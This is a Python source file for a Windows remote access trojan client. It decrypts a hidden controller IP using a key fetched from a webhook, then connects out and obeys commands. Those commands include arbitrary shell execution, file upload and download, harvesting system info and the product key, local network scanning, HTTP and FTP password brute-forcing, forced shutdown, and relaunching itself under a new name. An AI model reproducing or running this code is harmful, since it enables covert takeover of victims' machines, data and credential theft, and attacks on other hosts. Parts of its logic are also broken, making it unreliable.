import socket
from  win32api import * 
import os
import sys
from scapy.all import * 
class start():
	def loop_receive(socket, buffer):
		class inspect():
			def data(bytes, buffer, socket):
				dats = bytes.strip()
				print(dats)
				if dats == "test":
					socket.send("received!\x0A".encode("utf-8"))
				elif dats == "allinfo":
					import platform
					import socket as socketie
					tims = GetLocalTime()
					pays = str(tims[4]) + ":" + str(tims[5]) + ":" + str(tims[6])
					payload = '''
OS: %s
Local-Address: %s
System: %s
Computer-Name: %s
Current User-name: %s
Local Hostname: %s
Domain name: %s
Keyboard state: %s
Local-Time: %s'''%(platform.platform(), socketie.gethostbyname(socketie.gethostname()), platform.system(), GetComputerName(), GetUserName(), socketie.gethostname(), GetDomainName(), GetKeyboardState(),pays)
					socket.send(payload.encode("utf-8"))
				elif dats == "getprod":
					import subprocess
					call = subprocess.Popen("wmic path SoftwareLicensingService get OA3xOriginalProductKey", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					calls = call.stdout.read()
					if calls != None:
						socket.send(calls)
					else:
						socket.send("* Failure * ".encode("utf-8"))
				elif "exec" in dats:
					template = dats.split(":")
					cli = template[1]
					import subprocess
					calls = subprocess.Popen(cli, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					socket.send(calls.stdout.read() + calls.stderr.read())
				elif "showfiles" in dats:
					files = os.listdir()
					socket.send(b"\x0A".join(fr.encode("utf-8") for fr in files))
				elif "download" in dats:
					pops = dats.split(":")
					with open(pops[1], "rb") as file:
						rock = b"\n".join(ols for ols in file)
						socket.send(rock)	
				elif "shutdown" in dats:
					pops = dats.split(":")
					msg = pops[1]
					socket.send("shot".encode("utf-8"))
					try:
						InitiateSystemShutdown(None, msg, 10, 0, 0)
					except:
						socket.send('failure'.encode("utf-8"))
						xr = os.system("shutdown /t 10 /s")
						if xr == 0 and not 1:
							socket.send("compl".encode("utf-8"))
				elif "upload" in dats:
					poop = dats.split(";")
					socket.send("data".encode("utf-8"))
					with open(poop[1], "wb") as file:
						to_write_data = socket.recv(124128)
						print(to_write_data)
						file.write(to_write_data)
					socket.send("* Writing finished * ".encode("utf-8"))
				elif "checkac" in dats:
					#print("1232132131")
					belong = os.getcwd()
					rises = []
					directories = [f"C:\\Users\\{os.getlogin()}\\Pictures", f"C:\\", f"C:\\Users\\{os.getlogin()}\\Desktop", f"C:\\Users\\{os.getlogin()}\\Documents", f"C:\\Users\\{os.getlogin()}\\AppData\\"]
					for dirs in directories:
						try:
							trys = os.chdir(dirs)
							rises.append(dirs + "- Accessable")
						except Exception as failure:
							os.chdir(belong)
							rises.append(dirs + " - Failure")
					socket.send(b"\x0A".join(xox.encode() for xox in rises))
				elif "scanloc" in dats:
					belongs = dats.split(":")
					addr = get_if_addr(conf.iface).split(".")
					spils = addr[0] + "." + addr[1] + "." + addr[2] + "."
					print(spils)
					opens = []
					def thread_me(socket, addr, opens, ranges):
						def threads():
							def scan():
								for cr in range(ranges):
									toscan = addr + str(cr)
									#print(toscan)
									ifnone = sr1(IP(dst=toscan)/ICMP(), verbose=0, timeout=1)
									#print(ifnone)
									if ifnone != None:
										opens.append(toscan + "- Alive" + " MAC: %s"%(getmacbyip(toscan)))
									else:
										pass 
										#print("[-] FAILURE")
								socket.send(b"\x0A".join(ip.encode() for ip in opens))
							for o in range(1):
								ts = Thread(target=scan)
								ts.start()
						threads()
					thread_me(socket=socket, addr=spils, opens=opens, ranges=int(belongs[1]))
				elif "enumiface" in dats:
					route = conf.route
					socket.send(str(route).encode("utf-8"))
				elif "brute-http" in dats:
					act = dats.split(":")
					socket.send("wordlist".encode("utf-8"))
					big_data = ""
					#for exclusive_or in range(2):
						#try:
					#sor = socket
					#for incom in range(2):
					big_data += socket.recv(123112).decode("utf-8").strip()
					with open("plist.txt", "a", encoding="utf-8") as file:
						file.write(big_data.strip())
					socket.send("done".encode("utf-8"))
					print(act)
					host = act[1] 
					port = act[2]
					user = act[3]
					form = act[4]
					pform = act[5]
					words = []
					with open("plist.txt", "r", encoding="utf-8") as file:
						for lines in file:
							word = lines.strip()
							words.append(word)
					import requests
					site_ = "https://" + host + "/" + act[6]
					import urllib3
					urllib3.disable_warnings()
					varss = []
					for cwords in words:
						reqs = {f"{form}":f"{user}",f"{pform}":f"{cwords}"}
						print(reqs)
						ol = requests.post(site_, verify=False, data=site_.encode("utf-8"))
						print(act[6])
						if act[6] in ol.text:
							#print(ol.text)
							pass 
						else:
							varss.append("* Authentication completed! Username: %s Password: %s *"%(user, cwords))
							break 
					if len(varss) == 0:
						socket.send("* Authentication failure! * ".encode("utf-8"))
					else:
						socket.send(varss[0].encode("utf-8"))
				elif "brute-ftp" in dats:
					acto = dats.split(":")
					host = acto[1]
					port = acto[2]
					usr = acto[3]
					#print("123123213")
					socket.send("wordlist".encode("utf-8"))
					big_data = socket.recv(1232248).decode("utf-8")
					with open("ftp_list.txt", "w") as file:
						file.write(big_data)
					words = []
					with open("ftp_list.txt", "r") as filex:
						for lines in filex:
							word = lines.strip()
							#print(word)
							words.append(word)
					ready = []
					cor = socket
					def threadit(sockets, words, host, port):
						def __actual__():
							for passwords in words:
						#print(passwords)
								try:
								#print(host)
									#print(passwords)
									import socket  
									socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
									socks.connect((host, 21))
									socks.recv(21842).decode("utf-8")
									payload = "USER %s\r\x0APASS %s\r\x0A"%(usr, passwords)
									socks.send(payload.encode("utf-8"))
									ans = socks.recv(16581).decode("utf-8")
									print(ans)
									rnd = socks.recv(16813).decode("utf-8")
									print(rnd)
									if rnd ==  "failed" or "failure" in rnd:
										pass 
									else:
										ready.append("* Authentication completed! Pairs Username: %s Password: %s* "%(usr, passwords))
										break 
									socks.close()
								except Exception as failure:
									cor.send(f"* Failure connecting to host * ** Reason: {str(failure)} ** ".encode("utf-8"))
									break 
								else:
									def more(argument):
										return argument > 0
										if len(ready) == 0 and not more(argument=ready):
											cor.send("* Authentication failure * ".encode("utf-8"))
										else:
											cor.send(ready[0].encode("utf-8"))
						from threading import Thread
						for iss in range(1):
							selfs = Thread(target=__actual__)
							selfs.start()
					threadme = threadit(sockets=socket, words=words, host=host, port=port)
				elif "g3tmac" in dats:
					enum = get_if_addr(conf.iface)
					socket.send(f"IP: {enum}".encode("utf-8") + b"\x0A" + b"MAC: " +  str(getmacbyip(enum)).encode("utf-8"))
				elif "changeproc" in dats:
					name = dats.split(":")
					olx = name[1]
					countable = []
					with open(sys.argv[0], "r") as read:
						for lines in read:
							countable.append(lines)
					with open(olx, "w") as writes:
						bob =  "\x0A".join(cos for cos in countable)
						writes.write(bob)
					writes.close()
					ShellExecute(0, None, olx, None, os.getcwd(), 1)
					DeleteFile(olx)
		while True:
			data = socket.recv(buffer*1).decode()
			xr = inspect.data(bytes=data, buffer=buffer, socket=socket)
	def define_socket(af_inet):
		if af_inet == 'ipv6':
			return socket.socket(socket.AF_INET6, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
		else:
			return socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
	def connect_server(ip, port):
		socks4 = start.define_socket(af_inet="ipv4")
		_max_buffer = 16096
		socks4.connect((ip, port))
		start.loop_receive(socket=socks4, buffer=_max_buffer)
class decipher():
	def ip_host(host, ssl_check, socket_def, request_lib, aes_ip):
		def sockets(**kwargs):
			if kwargs.get("ssls") == False:

				import socket
				raw_sock = socket.socket()
				raw_sock.connect((kwargs.get("host"), 80))
				apart = kwargs.get("host").split(".")
				hosts = apart[2] + "." + apart[3]
				payload = f"GET / HTTP/1.1\r\x0AConnection: close\r\x0AHost: {hosts}\r\x0A\x0A"
				raw_sock.send(payload.encode("utf-8"))
				try:
					ans = raw_sock.recv(14812).decode("utf-8").split(" ")
			#		print(ans[1])
					if "404" in ans[1]:
						print("* Try with SSL, then . .*")
				except Exception as failure:
					print("* Try with requests for debug .. *")
					pass 
			else:
				import socket
				import ssl
				cont = ssl.create_default_context()
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.getprotobyname("tcp"))
				sock.connect((host, 443))
				socks = cont.wrap_socket(sock, server_hostname=host)
				payload = f"GET / HTTP/1.1\r\x0AConnection: close\r\x0AHost: {host}\r\x0A\x0A"
				socks.send(payload.encode("utf-8"))
				ans = socks.recv(124812).decode("utf-8")
				strips = ans.split(" ")
				strops = strips[17]
				solx = strops.split(":")
				key_ = solx[1]
				vec_ = solx[1]
				def deformit(text):
					pop = text.replace("}", "")
					pops = pop.replace('"', "")
					popi = pops.replace("'", "")
					#popis = 
					return popi
				plain = deformit(text=key_)
				vec_ = plain
				key_ = plain
				#print(vec_)
				from Cryptodome.Cipher import AES
				deeper = AES.new(key_.encode("utf-8"), AES.MODE_CBC, vec_.encode("utf-8"))
				deepers = deeper.decrypt(aes_ip).strip()
				#print(deepers)
				if b"\x02" in deepers:
					vor = deepers.split(b"\x02")
				elif b"\x03" in deepers:
					vor = deepers.split(b"\x03")
				ols = vor[0]
				return ols.decode("utf-8")
				#return ip.strip()
		#print(ssl_check)
		if ssl_check == False:
			if socket_def != False:
				#print(raw_socket)
				#print("12321312321")
				sockets(host=host, ssls=False)
				sys.exit(1)
			else:
				if request_lib == True and not False:
					print("  ")
		else:
			if socket_def == True:
				xr = sockets(host=host, ssls=True)
				return xr
def __main__(**kwargs):
	if kwargs.get("switch") == True and not False:
		# If ssl_check is on True, It will start checking If the provided host supports TLS/SSL, If it doesn't, It will take unessesary time!
		# socket_def is for raw socket, If it is True, It will start connecting from raw socket which is way faster.
		# aes_ip is for the encrypted IP, where it should by decrypted by the receiving message from the argument. 
		# request_lib is for request library, If it is True, It will start trying with the library, If it is not installed, It will take unessesary time!
		# Please test the client on local first, to see configuration. 
		ip = decipher.ip_host(host="enj2m9jklzk8cga.m.pipedream.net", ssl_check=True, socket_def=True, request_lib=False, aes_ip=b'F\x13\x92\xdb\x81\xb0\xae+\xa6\xc7\xcc\xd8\xc0\xf6\x06\xc0')
		#print(ip)
		start.connect_server(ip=ip, port=kwargs.get("port"))
	else:
		#print(xr)
		start.connect_server(ip=ip, port=kwargs.get("port"))
#ip = decipher.ip_(host="ZW5yeDhyeHZyemVrcHJhLm0ucGlwZWRyZWFtLm5ldA==", socketing=True)
cl = __main__(ip="", port=10491, switch=True) #  Switch is espically for Public IP address, use request.bin or other webhook to receive the decription key! (Webhook should support JSON!)